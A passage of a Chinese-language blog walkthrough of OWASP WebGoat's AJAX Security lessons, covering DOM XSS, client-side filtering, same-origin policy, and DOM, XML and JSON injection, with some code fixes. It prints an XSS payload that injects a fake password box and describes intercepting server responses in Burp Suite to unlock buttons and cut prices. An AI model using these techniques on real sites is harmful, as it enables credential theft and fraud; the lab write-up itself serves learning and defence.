&lt;h3 id=&quot;Stage-4&quot;&gt;&lt;a href=&quot;#Stage-4&quot; class=&quot;headerlink&quot; title=&quot;Stage 4&quot;&gt;&lt;/a&gt;Stage 4&lt;/h3&gt;&lt;p&gt;要求在提交数据中创建虚假的输入框，骗取用户的密码。&lt;br&gt;在输入框中输入如下代码：&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Please enter your password:&amp;lt;BR&amp;gt;&amp;lt;input type = &quot;password&quot; name=&quot;pass&quot;/&amp;gt;&amp;lt;button&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;onClick=&quot;javascript:alert(&#39;I have your password: &#39; +&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pass.value);&quot;&amp;gt;Submit&amp;lt;/button&amp;gt;&amp;lt;BR&amp;gt;&amp;lt;BR&amp;gt;&amp;lt;BR&amp;gt;&amp;lt;BR&amp;gt;&amp;lt;BR&amp;gt;&amp;lt;BR&amp;gt;&amp;lt;BR&amp;gt;&amp;lt;BR&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;BR&amp;gt;&amp;lt;BR&amp;gt;&amp;lt;BR&amp;gt;&amp;lt;BR&amp;gt;&amp;lt;BR&amp;gt;&amp;lt;BR&amp;gt;&amp;lt;BR&amp;gt;&amp;lt;BR&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;得到如下界面：&lt;br&gt;&lt;img src=&quot;/images/webgoat_ajax_security/6.png&quot; alt=&quot;6&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;Stage-5&quot;&gt;&lt;a href=&quot;#Stage-5&quot; class=&quot;headerlink&quot; title=&quot;Stage 5&quot;&gt;&lt;/a&gt;Stage 5&lt;/h3&gt;&lt;p&gt;这部分需要我们修复该漏洞。可以在tomcat\webapps\WebGoat\javascript中找到相关的脚本文件。编辑DOMXSS.js文件，将如下代码：&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;displayGreeting&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;name&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (name != &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.getElementById(&lt;span class=&quot;string&quot;&gt;&quot;greeting&quot;&lt;/span&gt;).innerHTML=&lt;span class=&quot;string&quot;&gt;&quot;Hello, &quot;&lt;/span&gt; + name + &lt;span class=&quot;string&quot;&gt;&quot;!&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;修改为：&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;displayGreeting&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;name&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (name != &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.getElementById(&lt;span class=&quot;string&quot;&gt;&quot;greeting&quot;&lt;/span&gt;).innerHTML=&lt;span class=&quot;string&quot;&gt;&quot;Hello, &quot;&lt;/span&gt; + escapeHTML(name); + &lt;span class=&quot;string&quot;&gt;&quot;!&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;其中，escapeHTML()为：&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;escapeHTML&lt;/span&gt; (&lt;span class=&quot;params&quot;&gt;str&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; div = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.createElement(&lt;span class=&quot;string&quot;&gt;&#39;div&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; text = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.createTextNode(str);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   div.appendChild(text);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; div.innerHTML;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;最后成功了。&lt;/p&gt;
&lt;h2 id=&quot;Client-Side-Filtering&quot;&gt;&lt;a href=&quot;#Client-Side-Filtering&quot; class=&quot;headerlink&quot; title=&quot;Client Side Filtering&quot;&gt;&lt;/a&gt;Client Side Filtering&lt;/h2&gt;&lt;p&gt;客户端过滤。&lt;/p&gt;
&lt;h3 id=&quot;Stage-1-1&quot;&gt;&lt;a href=&quot;#Stage-1-1&quot; class=&quot;headerlink&quot; title=&quot;Stage 1&quot;&gt;&lt;/a&gt;Stage 1&lt;/h3&gt;&lt;p&gt;这部分假设我是公司财务系统中的一员，我可以看到所有人的工资信息，但只有经理的工资信息我是没有权限看到的，需要我想办法看到经理的工资并提交。&lt;/p&gt;
&lt;p&gt;这部分的漏洞是在于服务器收到客户端的请求后，向客户端发送了过多的数据，虽然有一部分被隐藏起来了，普通页面看不到，但是仍然可以通过Firebug找到。如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/webgoat_ajax_security/3.png&quot; alt=&quot;3&quot;&gt;&lt;/p&gt;
&lt;p&gt;以上是其页面相应的选择框，其对应的页面源代码为：&lt;br&gt;&lt;img src=&quot;/images/webgoat_ajax_security/4.png&quot; alt=&quot;4&quot;&gt;&lt;/p&gt;
&lt;p&gt;而显示出来的结果，表格内容，其对应的页面源代码为：&lt;br&gt;&lt;img src=&quot;/images/webgoat_ajax_security/5.png&quot; alt=&quot;5&quot;&gt;&lt;/p&gt;
&lt;p&gt;由此看到了相对应的权限外的信息。&lt;/p&gt;
&lt;h3 id=&quot;Stage-2-1&quot;&gt;&lt;a href=&quot;#Stage-2-1&quot; class=&quot;headerlink&quot; title=&quot;Stage 2&quot;&gt;&lt;/a&gt;Stage 2&lt;/h3&gt;&lt;p&gt;这部分需要修补这个漏洞，让服务器只返回应该返回的信息。&lt;br&gt;这个漏洞的主要问题是服务端将所有数据返回给客户端，尽管这些敏感数据被隐藏了，但仍然可以被发现。因此该漏洞的填补是在XPath查询中增加一个过滤器。&lt;br&gt;在tomcat\webapps\WebGoat\lessons\Ajax\clientSideFiltering.jsp中，将源代码：&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;StringBuffer sb = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; StringBuffer();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sb.append(&lt;span class=&quot;string&quot;&gt;&quot;/Employees/Employee/UserID | &quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sb.append(&lt;span class=&quot;string&quot;&gt;&quot;/Employees/Employee/FirstName | &quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sb.append(&lt;span class=&quot;string&quot;&gt;&quot;/Employees/Employee/LastName | &quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sb.append(&lt;span class=&quot;string&quot;&gt;&quot;/Employees/Employee/SSN | &quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sb.append(&lt;span class=&quot;string&quot;&gt;&quot;/Employees/Employee/Salary &quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;String&lt;/span&gt; expression = sb.toString();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;修改为：&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;StringBuffer sb = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; StringBuffer();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sb.append(&lt;span class=&quot;string&quot;&gt;&quot;/Employees/Employee[Managers/Manager/text() = &quot;&lt;/span&gt; + userId + &lt;span class=&quot;string&quot;&gt;&quot;]/UserID | &quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sb.append(&lt;span class=&quot;string&quot;&gt;&quot;/Employees/Employee[Managers/Manager/text() = &quot;&lt;/span&gt; + userId + &lt;span class=&quot;string&quot;&gt;&quot;]/FirstName | &quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sb.append(&lt;span class=&quot;string&quot;&gt;&quot;/Employees/Employee[Managers/Manager/text() = &quot;&lt;/span&gt; + userId + &lt;span class=&quot;string&quot;&gt;&quot;]/LastName | &quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sb.append(&lt;span class=&quot;string&quot;&gt;&quot;/Employees/Employee[Managers/Manager/text() = &quot;&lt;/span&gt; + userId + &lt;span class=&quot;string&quot;&gt;&quot;]/SSN | &quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sb.append(&lt;span class=&quot;string&quot;&gt;&quot;/Employees/Employee[Managers/Manager/text() = &quot;&lt;/span&gt; + userId + &lt;span class=&quot;string&quot;&gt;&quot;]/Salary &quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;String&lt;/span&gt; expression = sb.toString();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;此时，客户端显示的代码如下：&lt;br&gt;&lt;img src=&quot;/images/webgoat_ajax_security/7.png&quot; alt=&quot;7&quot;&gt;&lt;br&gt;可看到，不该看到的内容，已经被很好的隐藏起来了。&lt;/p&gt;
&lt;h2 id=&quot;Same-Origin-Policy-Protection&quot;&gt;&lt;a href=&quot;#Same-Origin-Policy-Protection&quot; class=&quot;headerlink&quot; title=&quot;Same Origin Policy Protection&quot;&gt;&lt;/a&gt;Same Origin Policy Protection&lt;/h2&gt;&lt;p&gt;同源策略保护。同源策略是指，域名，协议，端口相同。它是客户端脚本，尤其是JavaScript的重要安全度量标准。它阻止从一个源加载的文档/脚本用来获取或设置另一个源加载的文档的属性。&lt;br&gt;AJAX技术的一项关键元素是XMLHttpRequest（XHR），该技术允许客户端向服务器端发起异步调用。然而，作为一项安全措施，这些请求最好只能从客户端原始页面向服务端发起访问。&lt;br&gt;这部分的主要目的是让我们熟悉同源策略。开始的时候是如下图所示的：&lt;br&gt;&lt;img src=&quot;/images/webgoat_ajax_security/8.png&quot; alt=&quot;8&quot;&gt;&lt;br&gt;可以看到，下面该页面下面依次有两个超链接，第一个是链接符合同源策略的，第二个链接是不符合同源策略的。&lt;br&gt;XMLHttp只能向同源服务器发送请求，任何向非同源服务端发送数据的尝试都将失败。&lt;/p&gt;
&lt;h2 id=&quot;DOM-Injection&quot;&gt;&lt;a href=&quot;#DOM-Injection&quot; class=&quot;headerlink&quot; title=&quot;DOM Injection&quot;&gt;&lt;/a&gt;DOM Injection&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/webgoat_ajax_security/9.png&quot; alt=&quot;9&quot;&gt;&lt;br&gt;可以看到该课程是要求我们输入激活码，然后网站拿去验证，我们的目标就是激活被禁用的按钮。我们首先需要理解激活码的验证过程。&lt;br&gt;浏览器与服务器通过Ajax技术实现XML通信。首先查看HTML源代码，发现代码中使用了XMLHttpRequest：&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;validate&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; keyField = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.getElementById(&lt;span class=&quot;string&quot;&gt;&#39;key&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; url = &lt;span class=&quot;string&quot;&gt;&#39;attack Screen=80&amp;amp;menu=1150&amp;amp;from=ajax&amp;amp;key=&#39;&lt;/span&gt; +&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;built_in&quot;&gt;encodeURIComponent&lt;/span&gt;(keyField.value);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt; XMLHttpRequest !=&lt;span class=&quot;string&quot;&gt;&#39;undefined&#39;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		req = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; XMLHttpRequest();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;built_in&quot;&gt;window&lt;/span&gt;.ActiveXObject) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		req = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; ActiveXObject(&lt;span class=&quot;string&quot;&gt;&#39;Microsoft.XMLHTTP&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	req.open(&lt;span class=&quot;string&quot;&gt;&#39;GET&#39;&lt;/span&gt;, url, &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	req.onreadystatechange = callback;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	req.send(&lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;callback&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (req.readyState == &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (req.status == &lt;span class=&quot;number&quot;&gt;200&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; message = req.responseText;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;built_in&quot;&gt;eval&lt;/span&gt;(message);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;&lt;span class=&quot;regexp&quot;&gt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可以看到XML响应给客户端浏览器的内容包括激活按钮的JavaScript语句，我们可以拦截服务器的响应，并修改其响应。&lt;br&gt;在链接传入请求：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/webgoat_ajax_security/10.png&quot; alt=&quot;10&quot;&gt;&lt;/p&gt;
&lt;p&gt;修改burpsuit的默认设置，开启响应拦截：&lt;br&gt;&lt;img src=&quot;/images/webgoat_ajax_security/11.png&quot; alt=&quot;11&quot;&gt;&lt;/p&gt;
&lt;p&gt;请求拦截后，依次点击:Action ——&amp;gt; Do intercept ——&amp;gt; Response to this request&lt;br&gt;设置拦截该请求的响应后，点击Forward，拦截到如下服务器的响应：&lt;br&gt;&lt;img src=&quot;/images/webgoat_ajax_security/12.png&quot; alt=&quot;12&quot;&gt;&lt;/p&gt;
&lt;p&gt;修改该响应，找到submit这里，&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/webgoat_ajax_security/13.png&quot; alt=&quot;13&quot;&gt;&lt;/p&gt;
&lt;p&gt;之后修改，去掉“disabled”字段，然后forward，可见浏览器显示的激活按钮已经可以按动了！&lt;/p&gt;
&lt;h2 id=&quot;XML-Injection&quot;&gt;&lt;a href=&quot;#XML-Injection&quot; class=&quot;headerlink&quot; title=&quot;XML Injection&quot;&gt;&lt;/a&gt;XML Injection&lt;/h2&gt;&lt;p&gt;AJAX应用程序使用XML与服务端进行信息交互。但该XML内容能够被非法用户轻易拦截并篡改。该课程进入之后是如下页面：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/webgoat_ajax_security/14.png&quot; alt=&quot;14&quot;&gt;&lt;/p&gt;
&lt;p&gt;这是一个积分兑换奖品的页面。&lt;br&gt;上面显示的是每件商品所对应的积分值。我的编号是：836239，当输入这个编号后，浏览器页面可以看到：&lt;br&gt;&lt;img src=&quot;/images/webgoat_ajax_security/15.png&quot; alt=&quot;15&quot;&gt;&lt;/p&gt;
&lt;p&gt;我的积分是100分，下面是我能够兑换到的商品列表，我可以选择性勾选后，点击提交。&lt;/p&gt;
&lt;p&gt;那么现在就是要求我们找到漏洞，使能够尽可能的买更多的东西，甚至能够超过我的所有积分的商品。&lt;/p&gt;
&lt;p&gt;我们可以猜测这件事情，在服务器端的处理逻辑是这样的：当客户输入其编号后，提交给服务器，服务器在后台进行查询，首先查到该客户的积分，然后把低于该积分的商品全部返回给客户端，由客户端进行选择后提交，由于之前已经进行过判断了，所以这里服务器没有再进行验证，因此我们把高于我们积分的商品勾选提交的时候，服务器有可能是通过的。&lt;/p&gt;
&lt;p&gt;同样我们用burpsuit拦截服务器返回的消息，如下：&lt;br&gt;&lt;img src=&quot;/images/webgoat_ajax_security/17.png&quot; alt=&quot;17&quot;&gt;&lt;/p&gt;
&lt;p&gt;然后修改为如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/webgoat_ajax_security/18.png&quot; alt=&quot;18&quot;&gt;&lt;br&gt;此时，客户端显示为如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/webgoat_ajax_security/16.png&quot; alt=&quot;16&quot;&gt;&lt;br&gt;最后两个也是可以勾选提交的了。&lt;/p&gt;
&lt;h2 id=&quot;JSON-Injection&quot;&gt;&lt;a href=&quot;#JSON-Injection&quot; class=&quot;headerlink&quot; title=&quot;JSON Injection&quot;&gt;&lt;/a&gt;JSON Injection&lt;/h2&gt;&lt;p&gt;JSON是JavaScript对象表示法，是存储和交换信息的语法。类似于XML，但JSON比XML更小、更快、更易解析。对于AJAX应用程序来说，JSON比XML更快更易使用。&lt;br&gt;开始的时候页面是这样的：&lt;br&gt;&lt;img src=&quot;/images/webgoat_ajax_security/19.png&quot; alt=&quot;19&quot;&gt;&lt;br&gt;这是一个关于机票的页面，输入出发地和目的地，浏览器和服务器之间实现Ajax通信，返回机票价格和路线信息，供客户选择，如下所示：&lt;br&gt;&lt;img src=&quot;/images/webgoat_ajax_security/20.png&quot; alt=&quot;20&quot;&gt;&lt;br&gt;可以看到有两条路线，一条便宜的，但中途会停。一条贵的，是直达的。我们的目标就是用便宜的钱坐直达的飞机。&lt;/p&gt;
&lt;p&gt;与上一个课程一样，同样是拦截服务器端返回的信息并修改。&lt;br&gt;原始请求返回信息为：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/webgoat_ajax_security/21.png&quot; alt=&quot;21&quot;&gt;&lt;/p&gt;
&lt;p&gt;拦截修改后为：&lt;br&gt;&lt;img src=&quot;/images/webgoat_ajax_security/22.png&quot; alt=&quot;22&quot;&gt;&lt;br&gt;价格由600改为100，嘻嘻。。&lt;/p&gt;
&lt;p&gt;页面显示为：&lt;br&gt;&lt;img src=&quot;/images/webgoat_ajax_security/23.png&quot; alt=&quot;23&quot;&gt;&lt;/p&gt;
